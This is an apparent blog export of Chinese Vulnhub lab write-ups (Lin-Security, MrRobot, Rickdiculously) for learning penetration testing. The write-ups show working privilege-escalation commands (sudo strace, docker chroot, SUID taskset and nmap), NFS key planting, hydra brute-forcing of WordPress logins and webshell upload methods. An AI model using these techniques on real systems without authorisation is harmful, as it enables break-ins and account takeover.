<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学会了<code>wordpress</code>后台上传<code>web-shell</code>的两种办法</p>
<ul>
<li>打包插件,植入web-shell,安装</li>
<li>打包主题,植入web-shell,安装</li>
<li>直接修改主题模板文件 404.php</li>
</ul>
<p><strong>而且信息收集很重要<del>~</del>!!!!!</strong></p>
<p>我是把简单的问题，复杂化了。<br><img src="https://images.atsud0.me/images/post/image-1586576193417.png" alt="anxie"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>smb-enum</tag>
        <tag>Wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Lin-Security</title>
    <url>/2020/07/12/Vulnhub-Lin-Security/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">靶机下载链接</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -p- 192.168.56.7 -T5 -sC -sV</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 07:39 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65528 closed ports</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)</span><br><span class="line">|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)</span><br><span class="line">|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)</span><br><span class="line">111&#x2F;tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  3           2049&#x2F;udp   nfs</span><br><span class="line">|   100003  3           2049&#x2F;udp6  nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp6  nfs</span><br><span class="line">|   100005  1,2,3      35075&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      39585&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      40841&#x2F;udp   mountd</span><br><span class="line">|   100005  1,2,3      57399&#x2F;udp6  mountd</span><br><span class="line">|   100021  1,3,4      37289&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      39940&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      46833&#x2F;tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      51407&#x2F;udp   nlockmgr</span><br><span class="line">|   100227  3           2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  3           2049&#x2F;udp6  nfs_acl</span><br><span class="line">2049&#x2F;tcp  open  nfs_acl  3 (RPC #100227)</span><br><span class="line">35075&#x2F;tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">41139&#x2F;tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">46833&#x2F;tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="line">58497&#x2F;tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds</span><br></pre></td></tr></table></figure>

<h3 id="NFS探测"><a href="#NFS探测" class="headerlink" title="NFS探测"></a>NFS探测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 111 --script&#x3D;nfs* 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 07:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home&#x2F;peter *</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.93 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="Walktrough-1"><a href="#Walktrough-1" class="headerlink" title="Walktrough-1"></a>Walktrough-1</h3><p>我这里首先是去利用nfs配置的错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir ~&#x2F;home</span><br><span class="line">sudo mount -o nolock 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br><span class="line">sudo grounpadd -g 1005 peter</span><br><span class="line">sudo adduser peter -uid 1001 -gid 1005</span><br><span class="line"></span><br><span class="line">su peter</span><br><span class="line">ssh-keygen</span><br><span class="line">cat ~&#x2F;home&#x2F;.ssh&#x2F;id_rsa.pub &gt;&#x2F;home&#x2F;kali&#x2F;home&#x2F;peter&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh peter@192.168.56.7</span><br></pre></td></tr></table></figure>

<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权-1"></a>提权-1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">peter@linsecurity:~$ sudo -l</span><br><span class="line">Matching Defaults entries for peter on linsecurity:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on linsecurity:</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;strace</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">peter@linsecurity:~$ sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh</span><br><span class="line">#id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<h4 id="提权-2"><a href="#提权-2" class="headerlink" title="提权-2"></a>提权-2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>docker内部的/etc/passwd和外部的/etc/passwd一样，所以，可以直接往里面添加个用户。实现提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg" alt=""></p>
<h4 id="提权-3"><a href="#提权-3" class="headerlink" title="提权-3"></a>提权-3</h4><p>在上面查看的/etc/passwd发现一个后门用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insecurity:AzER3pBZh6WZE:0:0::&#x2F;:&#x2F;bin&#x2F;sh</span><br><span class="line">username:passwd:uid:gid:::shell</span><br></pre></td></tr></table></figure>

<p>JTR加密，需要去解码后用密码登录。登录就是root</p>
<h4 id="提权-4"><a href="#提权-4" class="headerlink" title="提权-4"></a>提权-4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netkit-rlogin</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;xxd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netkit-rcp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netkit-rsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;taskset</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;sbin&#x2F;mount.nfs</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>

<h4 id="提权-5"><a href="#提权-5" class="headerlink" title="提权-5"></a>提权-5</h4><p>使用bob用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bob@linsecurity:&#x2F;home&#x2F;peter$ sudo -l</span><br><span class="line">[sudo] password for bob: </span><br><span class="line">Matching Defaults entries for bob on linsecurity:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linsecurity:</span><br><span class="line">    (ALL) &#x2F;bin&#x2F;ash, &#x2F;usr&#x2F;bin&#x2F;awk, &#x2F;bin&#x2F;bash, &#x2F;bin&#x2F;sh, &#x2F;bin&#x2F;csh, &#x2F;usr&#x2F;bin&#x2F;curl, &#x2F;bin&#x2F;dash, &#x2F;bin&#x2F;ed, &#x2F;usr&#x2F;bin&#x2F;env, &#x2F;usr&#x2F;bin&#x2F;expect, &#x2F;usr&#x2F;bin&#x2F;find, &#x2F;usr&#x2F;bin&#x2F;ftp, &#x2F;usr&#x2F;bin&#x2F;less, &#x2F;usr&#x2F;bin&#x2F;man, &#x2F;bin&#x2F;more, &#x2F;usr&#x2F;bin&#x2F;scp, &#x2F;usr&#x2F;bin&#x2F;socat,</span><br><span class="line">        &#x2F;usr&#x2F;bin&#x2F;ssh, &#x2F;usr&#x2F;bin&#x2F;vi, &#x2F;usr&#x2F;bin&#x2F;zsh, &#x2F;usr&#x2F;bin&#x2F;pico, &#x2F;usr&#x2F;bin&#x2F;rvim, &#x2F;usr&#x2F;bin&#x2F;perl, &#x2F;usr&#x2F;bin&#x2F;tclsh, &#x2F;usr&#x2F;bin&#x2F;git, &#x2F;usr&#x2F;bin&#x2F;script, &#x2F;usr&#x2F;bin&#x2F;scp</span><br></pre></td></tr></table></figure>
<p>都是提权方式。</p>
<h4 id="提权-6"><a href="#提权-6" class="headerlink" title="提权-6"></a>提权-6</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line">*&#x2F;1 *   * * *   root    &#x2F;etc&#x2F;cron.daily&#x2F;backup</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in $(ls &#x2F;home); do cd &#x2F;home&#x2F;$i &amp;&amp; &#x2F;bin&#x2F;tar -zcf &#x2F;etc&#x2F;backups&#x2F;home-$i.tgz *; done</span><br></pre></td></tr></table></figure>
<p>可以tar通配符提权。</p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这个靶机对我最大的帮助是让我复现了NFS共享目录可写的漏洞。其他的感觉都做过。。不过还有其他的提权方式我没一一复现。十分偏向新手。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub-MrRobot</title>
    <url>/2020/05/03/Vulnhub-MrRobot/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线靶机链接:<a href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener">MrRobot</a><br>下载链接:<a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener">MyRobot:1</a></p>
<p>靶机难度:简单/中等</p>
<p>这是一个<code>MrRobot</code>主题的靶机。<br>MrRobot是以网络安全题材的一部美剧（还挺好看的。</p>
<a id="more"></a>


<h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -p- -sC -T5 192.168.56.135</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-03 16:47 CST</span><br><span class="line">Nmap scan report for 192.168.56.135</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  closed ssh</span><br><span class="line">80&#x2F;tcp  open   http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">443&#x2F;tcp open   ssl&#x2F;http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 71.86 seconds</span><br></pre></td></tr></table></figure>
<p>目标机器开放了2个端口。</p>
<p>我们只能得知他开放了一个网站，探测一下网站根目录，</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_173306.jpg" alt="gobuster"></p>
<p>哦，有robots，先去看下有什么东西。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_200555.jpg" alt="robots"></p>
<p>emmmm,拿到第一个flag了。</p>
<p>还有一个有趣的东西，下载下来看看。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_200817.jpg" alt="facto"></p>
<p>看起来是个字典，可能在之后会用到。</p>
<p>访问一下网站<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_200918.jpg" alt="index"></p>
<p>这个网站很有趣，虽然我们在上面找不到什么信息。</p>
<h1 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h1><p>访问一下login后台，会发现是wordpress博客。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_201512.jpg" alt="wordpress"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_202027.jpg" alt="invalid"></p>
<p>输入admin，admin登录会发现提示是无效的用户名，而且网站没有限制错误次数登录。</p>
<p>加上我在网站的其他地方也没找到线索了，只能尝试爆破了，甚至还被耍了QAQ<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_201931.jpg" alt="readme"><br>先爆破出正确的用户名。我用的是<code>hydra</code>爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L ~&#x2F;Downloads&#x2F;fsocity.dic -p test -s 80 192.168.56.135 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F192.168.56.135%2Fwp-admin%2F&amp;testcookie&#x3D;1:F&#x3D;Invalid username&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_203404.jpg" alt="username"><br>爆破出正确的用户名后，爆破密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l Elliot -P ~&#x2F;Downloads&#x2F;fsocity.dic  -s 80 192.168.56.135 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2F192.168.56.135%2Fwp-admin%2F&amp;testcookie&#x3D;1:S&#x3D;302&quot;</span><br></pre></td></tr></table></figure>

<p>这里我爆破了5个小时。。。估计是没设置线程的原因把。(电脑太垃圾了把<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_211030.jpg" alt="passwd"></p>
<p>hydra -l Bill -P ~/Desktop/wordlists/rockyou.txt -s 8001 10.10.121.11 http-post-form “/:j_username=^USER^&amp;j_password=^PASS^&amp;from=/&amp;Submit=Sign in:S=302”</p>
<h1 id="上传web—shell"><a href="#上传web—shell" class="headerlink" title="上传web—shell"></a>上传web—shell</h1><p>成功登录，刚好我之前做过一次wordpress拿shell的靶机。上传方法有三种</p>
<ul>
<li>直接修改模板php，插入一句话</li>
<li>安装wordpress主题，主题夹带我们的shell。安装成功后访问页面。</li>
<li>安装插件 同上<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_212916.jpg" alt="login"></li>
</ul>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>nc开启监听后，访问<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_213129.jpg" alt="get-shell"></p>
<p>进去之后我先查看了有哪个用户，进去了他的家目录下拿了第二个flag<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_213401.jpg" alt="flag"></p>
<p>同时我们也拿到了robot用户的md5字段。<br>使用hashcat或者在线破解md5网站，进行爆破。</p>
<p>在webshell下打开一个交互性shell 目的是使我们能够切换用户，使用补全命令等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>使用sudo -l 查看有没有sudo权限。很显然是没有的<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_214115.jpg" alt="sudo"></p>
<p>查看suid位文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_214015.jpg" alt="suid"></p>
<p>嗯？发现了nmap。nmap也是可以执行命令的。<br>so?how to do?</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_214428.jpg" alt="nmap-root"></p>
<p>拿到最终flag。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_214509.jpg" alt="flag3"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学会了<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">nmap提权</a></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>hydra</tag>
        <tag>Wordpress</tag>
        <tag>GTFOBins-nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Rickdiculously</title>
    <url>/2020/07/18/Vulnhub-Rickdiculously/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li><a href="https://rickandmorty.fandom.com/wiki/The_Flesh_Curtains" target="_blank" rel="noopener">The_Flesh_Curtains</a></li>
<li><a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/" target="_blank" rel="noopener">靶机下载链接</a></li>
</ul>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-17 22:37 CST</span><br><span class="line">Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 71.43% done; ETC: 22:38 (0:00:02 remaining)</span><br><span class="line">Nmap scan report for 192.168.56.5</span><br><span class="line">Host is up (0.00091s latency).</span><br><span class="line">Not shown: 65528 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">21&#x2F;tcp    open  ftp        vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt</span><br><span class="line">|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.254</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp    open  ssh?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-31-generic x86_64)</span><br><span class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80&#x2F;tcp    open  http       Apache httpd 2.4.27 ((Fedora))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.27 (Fedora)</span><br><span class="line">|_http-title: Morty&#39;s Website</span><br><span class="line">9090&#x2F;tcp  open  http       Cockpit web service</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;192.168.56.5:9090&#x2F;</span><br><span class="line">13337&#x2F;tcp open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    FLAG:&#123;TheyFoundMyBackDoorMorty&#125;-10Points</span><br><span class="line">22222&#x2F;tcp open  ssh        OpenSSH 7.5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)</span><br><span class="line">|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)</span><br><span class="line">|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)</span><br><span class="line">60000&#x2F;tcp open  tcpwrapped</span><br><span class="line">2 services unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprints at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port22-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;7&#x2F;17%Time&#x3D;5F11B7C2%P&#x3D;x86_64-unknown-linux-gnu%r</span><br><span class="line">SF:(NULL,42,&quot;Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU&#x2F;Linux\x2</span><br><span class="line">SF:04\.4\.0-31-generic\x20x86_64\)\n&quot;);</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SF-Port13337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;7&#x2F;17%Time&#x3D;5F11B7C2%P&#x3D;x86_64-unknown-linux-gn</span><br><span class="line">SF:u%r(NULL,29,&quot;FLAG:&#123;TheyFoundMyBackDoorMorty&#125;-10Points\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 40.53 seconds</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
<li>21端口的<code>vsftpd</code>能够匿名登录。并且拥有pub目录可读。</li>
<li>22端口，连接上去后说不定能获得一些banner信息，可能是另外的服务。</li>
<li>80端口是web网站，httpd2.4.27</li>
<li>9090端口是服务器控制台?</li>
<li>13337直接就告诉了我们一个falg，但是不知道是什么东西，需要nc连接看看。</li>
<li>22222又是一个ssh端口，这个可能才是真ssh</li>
<li>60000不知道是什么。</li>
</ul>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://images.atsud0.me/images/post/Screenshot_20200717_230339.jpg" alt=""></p>
<p>ftp目录下只有一个flag文件可读，pub目录并没有其他的文件。并且没有目录遍历。线索可能到此为止。不过接下来还是可以考虑爆破用户名的。</p>
<h3 id="22端口-ssh"><a href="#22端口-ssh" class="headerlink" title="22端口 ssh?"></a>22端口 ssh?</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc 192.168.56.5 22</span><br><span class="line">Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-31-generic x86_64)</span><br></pre></td></tr></table></figure>
<p>只有一个系统版本的banner信息。</p>
<h3 id="80端口-HTTP"><a href="#80端口-HTTP" class="headerlink" title="80端口 HTTP"></a>80端口 HTTP</h3><p>目录扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232439.jpg" alt=""></p>
<p>首页<br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232507.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232525.jpg" alt=""></p>
<p>robots<br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232554.jpg" alt=""></p>
<p>passwords<br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232714.jpg" alt=""></p>
<p>passwords.html<br><img src="https://images.atsud0.me/images/post/Screenshot_20200717_232622.jpg" alt=""></p>
<p>这里告诉里我们一个密码，但是并不知道帐号是什么，也不知道这是什么服务的密码。</p>
